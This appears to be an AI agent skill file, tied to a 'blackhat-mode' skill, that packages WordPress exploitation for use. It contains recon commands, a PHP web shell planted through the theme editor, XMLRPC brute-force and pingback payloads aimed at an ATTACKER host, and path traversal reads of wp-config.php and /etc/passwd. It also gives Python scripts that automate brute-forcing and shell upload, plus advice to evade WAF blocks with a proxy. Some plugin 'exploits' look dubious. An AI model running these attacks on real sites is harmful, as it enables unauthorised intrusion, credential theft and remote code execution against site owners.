---
name: wp-tools
description: "WordPress exploitation — WP2SHELL, plugin abuse, theme vulns, XMLRPC."
version: 2.0.0
author: Yatim
metadata:
  hermes:
    tags: [wordpress, wp, wp2shell, plugin, theme, xmlrpc]
    related_skills: [blackhat-mode, exploit-tools, scan-tools]
prerequisites:
  commands: [python]
---

# WordPress Exploitation Tools

## When to Load This Skill

User requests:
- "WordPress", "WP", "WP2SHELL", "plugin exploit", "theme vuln"

---

## Recon

```bash
# Version detection
curl -s URL/readme.html
curl -s URL/wp-includes/version.php
curl -s URL/wp-login.php

# WPScan
wpscan --url URL --enumerate vp,vt,u

# Plugins
curl -s URL/wp-content/plugins/

# Themes
curl -s URL/wp-content/themes/

# Users
curl -s URL/wp-json/wp/v2/users
```

## Exploitation

### WP2SHELL

```bash
# Upload shell via theme editor
# 1. Login to wp-admin
# 2. Appearance > Theme Editor
# 3. Edit 404.php
# 4. Add: <?php system($_GET['cmd']); ?>
# 5. Access: URL/wp-content/themes/THEME/404.php?cmd=whoami
```

### XMLRPC Brute Force

```bash
# Brute force
curl -X POST URL/xmlrpc.php -d '<?xml version="1.0"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>password</value></param></params></methodCall>'

# Pingback
curl -X POST URL/xmlrpc.php -d '<?xml version="1.0"?><methodCall><methodName>pingback.ping</methodName><params><param><value>http://ATTACKER</value></param><param><value>URL</value></param></params></methodCall>'
```

### Plugin Exploits

```bash
# Contact Form 7
curl -X POST URL/?p= -d "action=cf7_show_response&_response_id=../wp-config.php"

# Yoast SEO
curl URL/wp-json/yoast/v1/redirects

# WooCommerce
curl URL/wp-json/wc/v3/system_status

# Advanced Custom Fields
curl URL/wp-json/acf/v3/options
```

### Theme Exploits

```bash
# File inclusion
curl URL/wp-content/themes/THEME/404.php?file=../../../../etc/passwd

# RCE
curl URL/wp-content/themes/THEME/functions.php?cmd=whoami
```

---

## Python WordPress Tools

### WP Scanner

```python
import requests

def wp_scan(url):
    results = {}
    
    # Version
    r = requests.get(f"{url}/readme.html")
    if 'Version' in r.text:
        results['version'] = r.text.split('Version ')[1].split('<')[0]
    
    # Users
    r = requests.get(f"{url}/wp-json/wp/v2/users")
    if r.status_code == 200:
        results['users'] = [u['slug'] for u in r.json()]
    
    # Plugins
    r = requests.get(f"{url}/wp-content/plugins/")
    results['plugins'] = [p for p in r.text.split('/wp-content/plugins/')[1:] if '/']
    
    return results
```

### WP Brute

```python
import requests
import xml.etree.ElementTree as ET

def wp_brute(url, username, password):
    payload = f'''<?xml version="1.0"?>
<methodCall>
  <methodName>wp.getUsersBlogs</methodName>
  <params>
    <param><value>{username}</value></param>
    <param><value>{password}</value></param>
  </params>
</methodCall>'''
    
    r = requests.post(f"{url}/xmlrpc.php", data=payload)
    
    if 'faultCode' not in r.text:
        return True
    return False
```

### WP Shell Upload

```python
import requests

def wp_upload_shell(url, username, password, shell_code):
    # Login
    session = requests.Session()
    login_data = {
        'log': username,
        'pwd': password,
        'wp-submit': 'Log In'
    }
    session.post(f"{url}/wp-login.php", data=login_data)
    
    # Edit theme
    theme_data = {
        'action': 'update',
        'file': '404.php',
        'newcontent': shell_code,
        'theme': 'flavor',
        '_wpnonce': '...',
    }
    session.post(f"{url}/wp-admin/theme-editor.php", data=theme_data)
    
    # Execute
    r = session.get(f"{url}/wp-content/themes/flavor/404.php?cmd=whoami")
    return r.text
```

---

## Output Format

```json
{
  "url": "http://wordpress.com",
  "version": "6.0",
  "users": ["admin", "editor"],
  "plugins": ["akismet", "jetpack"],
  "themes": ["flavor", "flavor-child"],
  "vulnerabilities": [
    {"type": "xmlrpc", "severity": "medium"},
    {"type": "plugin_rce", "severity": "critical"}
  ]
}
```

---

## Error Handling

| Error | Cause | Solution |
|-------|-------|----------|
| 403 Forbidden | WAF blocked | Use proxy |
| 404 Not Found | Wrong path | Check path |
| Auth failed | Wrong credentials | Try brute force |
| XMLRPC disabled | Feature disabled | Try alternative |
